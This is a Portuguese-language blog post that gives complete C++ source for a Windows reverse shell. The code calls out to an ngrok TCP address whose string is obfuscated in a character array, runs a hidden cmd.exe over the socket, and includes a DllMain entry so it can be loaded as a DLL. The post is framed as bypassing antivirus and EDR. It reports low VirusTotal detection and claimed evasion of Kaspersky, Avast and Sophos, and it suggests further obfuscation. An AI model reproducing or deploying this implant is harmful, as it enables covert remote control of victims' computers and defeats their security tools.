---
weight: 2
title: "Post II: Reverse Shell"
date: 2024-10-12T15:58:26+08:00
lastmod: 2024-10-12T15:58:26+08:00
draft: false
author: Vith0r
authorLink: https://github.com/Vith0r
description: Reverse Shell Simples.
images: 
resources:
  - name: featured-image
    src: Image.jpeg
tags:
  - Malware
categories:
  - Malware
lightgallery: true
toc:
  auto: false
---

Seja muito **bem-vindo(a)** ao meu **humilde blog**.

Neste post, vamos explorar a criação de um **Reverse Shell** simples, com o objetivo de contornar alguns **AVs/EDRs**. O objetivo deste post é focado em entender o funcionamento básico de uma **Reverse Shell**. Vamos utilizar a linguagem **C++** com a API **Winsock** para implementar a comunicação de rede e interagir com o processo do **cmd.exe** no Windows.

> [!warning] Warning
> As informações que você encontrar neste post, técnicas, códigos, provas de conceito ou qualquer outra coisa são estritamente para fins educacionais.

Nosso código utiliza **multithreading**, **pipes**, e **sockets** para interagir diretamente com o terminal remoto, permitindo o envio e recebimento de comandos. Ao longo do desenvolvimento, vamos detalhar cada parte do código e como ela se relaciona com a construção de um **Reverse Shell** funcional.
## Parte Principal: Configuração da Conexão de Rede
A parte principal do nosso código é responsável por estabelecer a comunicação entre o cliente **máquina atacante** e o servidor **máquina alvo**. Utilizamos o **Winsock** para criar e conectar um socket que será usado para enviar e receber dados.

```cpp
WSADATA wsaData;
SOCKET sock;
struct addrinfo hints = { 0 }, * result;

if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
    fprintf(stderr, "Falha na inicializacao do Winsock\n");
    return 1;
}

hints.ai_family = AF_INET;
hints.ai_socktype = SOCK_STREAM;
hints.ai_protocol = IPPROTO_TCP;

char NotNgrok[] = { '0', '.', 't', 'c', 'p', '.', 's', 'a', '.', 'n', 'g', 'r', 'o', 'k', '.', 'i', 'o', 0 };
char NotPort[] = { '1', '3', '3', '7', 0 };

if (getaddrinfo(NotNgrok, NotPort, &hints, &result) != 0) {
    fprintf(stderr, "Falha no endereço NGROK\n");
    WSACleanup();
    return 1;
}

sock = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
if (sock == INVALID_SOCKET) {
    fprintf(stderr, "Falha ao criar socket: %d\n", WSAGetLastError());
    freeaddrinfo(result);
    WSACleanup();
    return 1;
}
```
Aqui, configuramos o **Winsock** e criamos o socket que será usado para a comunicação. O endereço IP e a porta do servidor são passados como strings. Utilizamos um endereço [NGROK](https://ngrok.com/) para redirecionar o tráfego para o cliente.
## Parte de Comunicação: Interação com o cmd.exe

Depois de configurar o socket, precisamos redirecionar a entrada e saída do processo `cmd.exe` para o nosso socket, permitindo que os comandos recebidos sejam executados e suas saídas retornadas ao atacante.
## Multithreading, Pipes e Sockets

Para que a nossa **Reverse Shell** funcione corretamente, precisamos lidar com a comunicação entre dois processos distintos: o `cmd.exe` (que executa os comandos) e o cliente (a máquina que enviará e receberá os comandos remotamente). Para isso, utilizamos três componentes fundamentais: **multithreading**, **pipes**, e **sockets**.

---
### Multithreading

No nosso caso, como temos duas fontes de dados diferentes (o socket e o processo cmd.exe), precisamos de duas threads separadas para tratar o envio e o recebimento de informações. A **multithreading** permite que nosso programa execute múltiplas tarefas ao mesmo tempo, sem que uma interfira na outra. Assim, enquanto uma thread recebe dados do socket e os envia para o `cmd.exe`, a outra pode ler a saída do `cmd.exe` e devolver ao atacante.

Na implementação, criei duas threads principais:

1. **Thread 1**: responsável por ler a saída do `cmd.exe` (por meio de pipes) e enviar essa saída de volta ao cliente pela rede.
2. **Thread 2**: responsável por receber os comandos enviados pelo atacante através do socket e passá-los para o `cmd.exe`, simulando uma sessão interativa de terminal.

Ao dividir essas tarefas em threads separadas, evitamos que o programa fique travado esperando por uma ação, garantindo que a comunicação seja rápida e fluida entre os dois lados.

---
### Pipes

Os **pipes** são um mecanismo usado para redirecionar a entrada e a saída de processos no Windows. Eles atuam como canais de comunicação entre o nosso programa e o processo `cmd.exe`. Para o `cmd.exe`, a entrada (stdin) e a saída (stdout) são redirecionadas para esses pipes, de forma que possamos "escrever" comandos diretamente no stdin e "ler" os resultados a partir do stdout.

Criei dois pipes principais:

- **Pipe de entrada**: recebe os dados do socket (os comandos enviados pelo atacante) e os envia ao `cmd.exe`.
- **Pipe de saída**: captura a saída do `cmd.exe` e a envia de volta ao cliente, de forma que o atacante possa ver o resultado dos comandos.

Isso nos permite interagir diretamente com o processo, como se estivéssemos executando os comandos localmente.

---
### Sockets

Por último, utilizamos **sockets** para estabelecer a comunicação de rede entre a máquina atacante e a máquina alvo. Um socket é basicamente um ponto final em uma conexão de rede. No nosso caso, configuramos um socket TCP, que será responsável por enviar e receber dados da máquina remota.

Através do **Winsock**, que é a API de **sockets** do Windows, criamos uma conexão entre o cliente (máquina atacante) e o servidor (máquina alvo). Esse socket atua como um canal de comunicação bidirecional, o atacante envia comandos através dele, e nossa Reverse Shell recebe e executa esses comandos, enviando as saídas de volta pelo mesmo canal.

---
### Criação dos Pipes

Criamos pipes para redirecionar a saída do `cmd.exe` (stdout) e a entrada (stdin), utilizando a estrutura **SECURITY_ATTRIBUTES** para permitir a herança de handles entre processos.

```cpp
HANDLE hStdoutRead, hStdoutWrite;
HANDLE hStdinRead, hStdinWrite;
SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };

if (!CreatePipe(&hStdoutRead, &hStdoutWrite, &sa, 0)) {
    fprintf(stderr, "Falha ao criar pipe stdout\n");
    closesocket(sock);
    WSACleanup();
    return 1;
}

if (!CreatePipe(&hStdinRead, &hStdinWrite, &sa, 0)) {
    fprintf(stderr, "Falha ao criar pipe stdin\n");
    closesocket(sock);
    WSACleanup();
    return 1;
}
```

Esses pipes permitem que os dados trafeguem entre o nosso programa e o processo do `cmd.exe`.
## Criação do Processo cmd.exe
Em seguida, criamos o processo do `cmd.exe`, redirecionando sua entrada e saída para os pipes que acabamos de criar.

```cpp
STARTUPINFO si = { 0 };
PROCESS_INFORMATION pi = { 0 };
si.cb = sizeof(si);
si.dwFlags = STARTF_USESTDHANDLES;
si.hStdInput = hStdinRead;
si.hStdOutput = hStdoutWrite;
si.hStdError = hStdoutWrite;

LPWSTR cmd = charToLPWSTR("cmd.exe");

if (!CreateProcess(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
    fprintf(stderr, "Falha ao criar o processo cmd.exe: %d\n", GetLastError());
    closesocket(sock);
    WSACleanup();
    free(cmd);
    return 1;
}

free(cmd);
```

O processo `cmd.exe` é iniciado invisível, e suas entradas e saídas estão agora conectadas aos nossos pipes.
## Threads para Comunicação Bidirecional

```cpp
ThreadParams readParams = { hStdoutRead, sock };
ThreadParams writeParams = { hStdinWrite, sock };

_beginthreadex(NULL, 0, &ReadFromCmd, &readParams, 0, NULL);
_beginthreadex(NULL, 0, &WriteToCmd, &writeParams, 0, NULL);

WaitForSingleObject(pi.hProcess, INFINITE);
```

E aqui, as **threads** são criadas para gerenciar o envio e recebimento de dados, e o programa espera até que o processo `cmd.exe` seja finalizado.
## Código completo

```cpp
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <stdlib.h>
#include <process.h>
#include <string>

#pragma comment(lib, "ws2_32.lib")

LPWSTR charToLPWSTR(const std::string& str) {
    int len = MultiByteToWideChar(CP_ACP, 0, str.c_str(), -1, NULL, 0);
    LPWSTR wString = (LPWSTR)malloc(len * sizeof(wchar_t));
    if (wString != NULL) {
        MultiByteToWideChar(CP_ACP, 0, str.c_str(), -1, wString, len);
    }
    return wString;
}

struct ThreadParams {
    HANDLE hPipe;
    SOCKET sock;
};

unsigned __stdcall ReadFromCmd(void* params) {
    ThreadParams* tp = static_cast<ThreadParams*>(params);
    HANDLE hPipe = tp->hPipe;
    SOCKET sock = tp->sock;
    char buffer[1024];
    DWORD bytesRead;

    while (true) {
        if (ReadFile(hPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
            buffer[bytesRead] = '\0';
            send(sock, buffer, bytesRead, 0);
        }
        else {
            break;
        }
    }

    return 0;
}

unsigned __stdcall WriteToCmd(void* params) {
    ThreadParams* tp = static_cast<ThreadParams*>(params);
    HANDLE hPipe = tp->hPipe;
    SOCKET sock = tp->sock;
    char buffer[1024];
    int result_recv;
    DWORD bytesWritten;

    while (true) {
        result_recv = recv(sock, buffer, sizeof(buffer) - 1, 0);
        if (result_recv > 0) {
            WriteFile(hPipe, buffer, result_recv, &bytesWritten, NULL);
        }
        else {
            break;
        }
    }

    return 0;
}

int main() {

    WSADATA wsaData;
    SOCKET sock;
    struct addrinfo hints = { 0 }, * result;
    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    HANDLE hStdoutRead, hStdoutWrite;
    HANDLE hStdinRead, hStdinWrite;

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        fprintf(stderr, "Falha na inicializacao do Winsock\n");
        return 1;
    }

    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    char NotNgrok[] = { '0', '.', 't', 'c', 'p', '.', 's', 'a', '.', 'n', 'g', 'r', 'o', 'k', '.', 'i', 'o', 0 };
    char NotPort[] = { '1', '3', '3', '7', 0 };

    if (getaddrinfo(NotNgrok, NotPort, &hints, &result) != 0) {
        fprintf(stderr, "Falha no endereço NGROK\n");
        WSACleanup();
        return 1;
    }

    sock = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (sock == INVALID_SOCKET) {
        fprintf(stderr, "Falha ao criar socket: %d\n", WSAGetLastError());
        freeaddrinfo(result);
        WSACleanup();
        return 1;
    }

    if (connect(sock, result->ai_addr, (int)result->ai_addrlen) == SOCKET_ERROR) {
        fprintf(stderr, "Falha ao conectar ao servidor: %d\n", WSAGetLastError());
        closesocket(sock);
        freeaddrinfo(result);
        WSACleanup();
        return 1;
    }

    freeaddrinfo(result);

    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;

    if (!CreatePipe(&hStdoutRead, &hStdoutWrite, &sa, 0)) {
        fprintf(stderr, "Falha ao criar pipe stdout\n");
        closesocket(sock);
        WSACleanup();
        return 1;
    }
    if (!CreatePipe(&hStdinRead, &hStdinWrite, &sa, 0)) {
        fprintf(stderr, "Falha ao criar pipe stdin\n");
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    si.hStdInput = hStdinRead;
    si.hStdOutput = hStdoutWrite;
    si.hStdError = hStdoutWrite;

    LPWSTR cmd = charToLPWSTR("cmd.exe");

    if (!CreateProcess(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        fprintf(stderr, "Falha ao criar o processo cmd.exe: %d\n", GetLastError());
        closesocket(sock);
        WSACleanup();
        free(cmd);
        return 1;
    }

    free(cmd);

    CloseHandle(hStdoutWrite);
    CloseHandle(hStdinRead);

    ThreadParams readParams = { hStdoutRead, sock };
    ThreadParams writeParams = { hStdinWrite, sock };

    _beginthreadex(NULL, 0, &ReadFromCmd, &readParams, 0, NULL);
    _beginthreadex(NULL, 0, &WriteToCmd, &writeParams, 0, NULL);

    WaitForSingleObject(pi.hProcess, INFINITE);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hStdoutRead);
    CloseHandle(hStdinWrite);
    closesocket(sock);
    WSACleanup();

    return 0;
}

#ifdef _WINDLL
__declspec(dllexport) BOOL WINAPI DllMain(HINSTANCE hInstance, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, NULL, 0, NULL);
    }
    return TRUE;
}
#endif
```

---
# Conclusão

Concluímos a implementação de um **Reverse Shell** funcional utilizando **C++** e a API **Winsock**. Este código, apesar de simples, demonstra os conceitos fundamentais de redirecionamento de processos, manipulação de **sockets** e comunicação remota.

Ao longo deste post, exploramos como redirecionar a entrada e saída de um processo do **cmd.exe**, além de como implementar a comunicação bidirecional entre o cliente e o servidor por meio de **sockets**. Este é um exemplo claro de como os sistemas operacionais e redes podem ser manipulados para criar soluções poderosas de controle remoto.
## Contra VirusTotal

Bom, contra o **VirusTotal** obtivemos um total de apenas **2** detecções, o que é consideravelmente pouco, se quisermos, um resultado melhor, podemos combinar **criptografia** de comando com chave aleatória e funções de **ofuscação** por exemplo no `CreateProcess`.

![VirusTotal](https://i.imgur.com/owwftR6.png)

## Contra AV/EDR
Bom os **antivírus** que utilizei de teste foram ( [kaspersky](https://www.kaspersky.com.br/), [avast](https://www.avast.com/), [sophos](https://www.sophos.com/pt-br/products/endpoint-antivirus/edr) ), conseguimos contornar os três sem nenhum aviso.

<iframe width="760" height="515" src="https://www.youtube.com/embed/fxaZbGySYTk" frameborder="0" allowfullscreen></iframe>

Por fim, conseguimos ver que não é muito difícil contornar alguns antivírus utilizando um código simples de **reverse shell**. Lembrando que o código tem muito a melhorar e que estamos apenas levando em consideração um **acesso inicial**. Em um computador protegido, sem configurações ou regras, as coisas são diferentes em ambientes realmente configurados e controlados.

Espero que tenham gostado deste post simples. Obrigado se chegou até aqui, e tchau tchau.